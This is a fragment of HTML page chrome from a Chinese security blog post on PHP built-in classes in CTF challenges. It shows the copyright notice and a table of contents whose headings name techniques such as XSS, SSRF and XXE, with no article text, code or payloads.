 </div><div class="p-copyright"><blockquote><div class="p-copyright-author"><span class="p-copyright-key">本文作者：</span><span class="p-copytight-value"><a href="mailto:litreily@163.com">sakura</a></span></div><div class="p-copyright-link"><span class="p-copyright-key">本文链接：</span><span class="p-copytight-value"><a href="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/">https://sakurahack-y.github.io/2022/11/20/php原生类学习/</a></span></div><div class="p-copyright-note"><span class="p-copyright-key">版权声明：</span><span class="p-copytight-value">本博客所有文章除特殊声明外，均采用<a rel="nofollow" target="_blank" href="https://creativecommons.org/licenses/by-nc/4.0/"> CC BY-NC 4.0 </a>许可协议。转载请注明出处 <a href="https://sakurahack-y.github.io">sakura的博客</a>！</span></div></blockquote></div></article><div class="p-info box"><span class="p-tags"><i class="fa fa-tag"></i><a href="/tags/php/">php</a></span></div><aside id="toc"><div class="toc-title">目录</div><nav><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E5%90%84%E6%96%B9%E6%B3%95%E5%86%85%E7%BD%AE%E7%B1%BB"><span class="toc-number">1.</span> <span class="toc-text">查看各方法内置类</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%88%A9%E7%94%A8Error-Exception%E5%86%85%E7%BD%AE%E7%B1%BB%E8%BF%9B%E8%A1%8CXSS"><span class="toc-number">2.</span> <span class="toc-text">利用Error&#x2F;Exception内置类进行XSS</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Error%E7%B1%BB"><span class="toc-number">2.1.</span> <span class="toc-text">Error类</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exception%E7%B1%BB"><span class="toc-number">2.2.</span> <span class="toc-text">Exception类</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#BJDCTF-2nd-xss%E4%B9%8B%E5%85%89"><span class="toc-number">2.3.</span> <span class="toc-text">[BJDCTF 2nd]xss之光</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%88%A9%E7%94%A8Error-Exception-%E5%86%85%E7%BD%AE%E7%B1%BB%E7%BB%95%E8%BF%87%E5%93%88%E5%B8%8C%E6%AF%94%E8%BE%83"><span class="toc-number">3.</span> <span class="toc-text">利用Error&#x2F;Exception 内置类绕过哈希比较</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#2020-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-Greatphp"><span class="toc-number">3.1.</span> <span class="toc-text">[2020 极客大挑战]Greatphp</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%AF%E9%81%8D%E5%8E%86%E7%9B%AE%E5%BD%95%E7%B1%BB"><span class="toc-number">4.</span> <span class="toc-text">可遍历目录类</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Directorylterator"><span class="toc-number">4.1.</span> <span class="toc-text">Directorylterator</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Filesystemlterator"><span class="toc-number">4.2.</span> <span class="toc-text">Filesystemlterator</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SplFileObject"><span class="toc-number">4.3.</span> <span class="toc-text">SplFileObject</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%AA%81%E7%A0%B4open-basedir%E7%9A%84%E9%99%90%E5%88%B6"><span class="toc-number">5.</span> <span class="toc-text">突破open_basedir的限制</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%88%A9%E7%94%A8SoapClient%E7%B1%BB%E8%BF%9B%E8%A1%8CCRLF-SSRF"><span class="toc-number">6.</span> <span class="toc-text">利用SoapClient类进行CRLF+SSRF</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#CRLF"><span class="toc-number">6.1.</span> <span class="toc-text">CRLF</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#N1CTF-2018-easy-harder-php"><span class="toc-number">6.2.</span> <span class="toc-text">[N1CTF 2018]easy_harder_php</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SUCTF-2019-Upload-Labs-2"><span class="toc-number">6.3.</span> <span class="toc-text">[SUCTF 2019]Upload Labs 2</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%88%A9%E7%94%A8ReflectionMethod%E8%AF%BB%E5%8F%96User%E7%B1%BB%E7%9A%84%E6%96%B9%E6%B3%95"><span class="toc-number">7.</span> <span class="toc-text">利用ReflectionMethod读取User类的方法</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#ReflectionMethod%E7%B1%BB"><span class="toc-number">7.1.</span> <span class="toc-text">ReflectionMethod类</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ReflectionClass-API"><span class="toc-number">7.1.1.</span> <span class="toc-text">ReflectionClass API</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E5%8D%81%E5%9B%9B%E5%B1%8A%E5%85%A8%E5%9B%BD%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B-easy-resource"><span class="toc-number">7.2.</span> <span class="toc-text">[第十四届全国信息安全竞赛]easy_resource</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-SimpleXMLElement-%E7%B1%BB%E8%BF%9B%E8%A1%8C-XXE"><span class="toc-number">8.</span> <span class="toc-text">使用 SimpleXMLElement 类进行 XXE</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#SimpleXMLElement-%E7%B1%BB"><span class="toc-number">8.1.</span> <span class="toc-text">SimpleXMLElement 类</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SUCTF-2018-Homework"><span class="toc-number">8.2.</span> <span class="toc-text">[SUCTF 2018]Homework</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-ZipArchive-%E7%B1%BB%E6%9D%A5%E5%88%A0%E9%99%A4%E6%96%87%E4%BB%B6"><span class="toc-number">9.</span> <span class="toc-text">使用 ZipArchive 类来删除文件</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#ZipArchive-%E7%B1%BB"><span class="toc-number">9.1.</span> <span class="toc-text">ZipArchive 类</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A2%A6%E9%87%8C%E8%8A%B1%E5%BC%80%E7%89%A1%E4%B8%B9%E4%BA%AD"><span class="toc-number">9.2.</span> <span class="toc-text">梦里花开牡丹亭</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-number">10.</span> <span class="toc-text">参考链接</span></a></li></ol></nav></aside></div><section class="p-ext"><div class="l-pager l-pager-dtl box"><a class="next" href="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/">内网学习篇 &gt;</a></div><div id="valine-comment"><style type="text/css">.night .v[data-class=v] a { color: #0F9FB4 !important; }
 .night .v[data-class=v] a:hover { color: #216C73 !important; }
